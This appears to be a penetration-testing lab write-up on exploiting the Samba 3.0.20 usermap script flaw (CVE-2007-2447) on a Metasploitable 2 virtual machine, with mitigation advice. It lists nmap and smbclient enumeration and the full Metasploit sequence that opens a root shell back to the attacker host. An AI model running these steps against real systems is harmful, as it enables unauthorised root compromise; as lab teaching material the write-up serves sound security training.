# Lab 04: Samba Usermap Script Exploitation

## Overview
This lab demonstrates the exploitation of a critical vulnerability in **Samba 3.0.20** on the Metasploitable 2 machine.  
The objective is to identify the vulnerable SMB service, perform proper enumeration, exploit the vulnerability using Metasploit, and achieve root-level access.

This lab emphasizes that **successful exploitation depends on accurate version identification**, and that an exploit failing does not necessarily imply system security.

---

## Lab Environment

| Component | Details |
|---------|--------|
| Attacker | Kali Linux |
| Target | Metasploitable 2 |
| Network | Internal Network |
| Tooling | Nmap, smbclient, Metasploit Framework |

---

## Reconnaissance

### Service Enumeration
Initial service enumeration was performed to identify SMB services:

```bash
nmap -sV -p 139,445 192.168.56.103
```

***Result***
-SMB ports 139/tcp and 445/tcp were open
-Service identified as Samba smbd 3.0.20-Debian
-This version is known to be vulnerable to command execution via the usermap script functionality

## SMB Enumeration
To further assess SMB configuration and access permissions, anonymous enumeration was performed:
```
smbclient -L //192.168.56.103/ -N
```

## Findings
Anonymous login was allowed
Multiple SMB shares were accessible
This indicates weak access control and increased attack surface

### Vulnerability Identification
-Service: SMB (Samba)
-3Software: Samba
-Version: 3.0.20
-CVE: CVE-2007-2447

## Vulnerability Type
Command Injection / Remote Code Execution

## Impact
Unauthenticated attackers can execute arbitrary commands
Exploitation leads to root-level access
Full system compromise is possible

## Exploit Availability
Publicly available
Supported by Metasploit Framework

## Exploitation
Metasploit Module Used
```
exploit/multi/samba/usermap_script
```

## Exploitation Steps
```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.103
set LHOST 192.168.56.102
run
```

## Post-Exploitation
Upon successful exploitation, a command shell session was established.
Privilege Verification
```
whoami
```
***Output:***
```
root
```
## System Information
```
uname -a
```
The attacker gained full control of the target system with root privileges.

## Proof of Compromise
-Root shell access obtained
-Ability to read sensitive system files (e.g. /etc/passwd)
-Full control over services and system configuration

## Security Impact
-This vulnerability allows:
-Unauthenticated remote code execution
-Immediate root-level compromise
-Complete system takeover
-Such weaknesses demonstrate the severe risks of running outdated or misconfigured SMB services, especially within internal networks where lateral movement is possible.

## Mitigation Recommendations
-Upgrade Samba to a secure, supported version
-Disable SMBv1 if not required
-Restrict anonymous SMB access
-Apply network segmentation and firewall rules
-Conduct regular vulnerability assessments and patch management

### Conclusion
This lab demonstrates that legacy services like Samba can present critical security risks when left unpatched or improperly configured.
Successful exploitation depends on accurate enumeration and version-specific analysis, and the absence of a working exploit does not imply that a system is secure.
Proper penetration testing requires thorough reconnaissance, validation, and contextual risk analysis.

## References
-https://www.exploit-db.com/exploits/16320
-https://docs.metasploit.com/
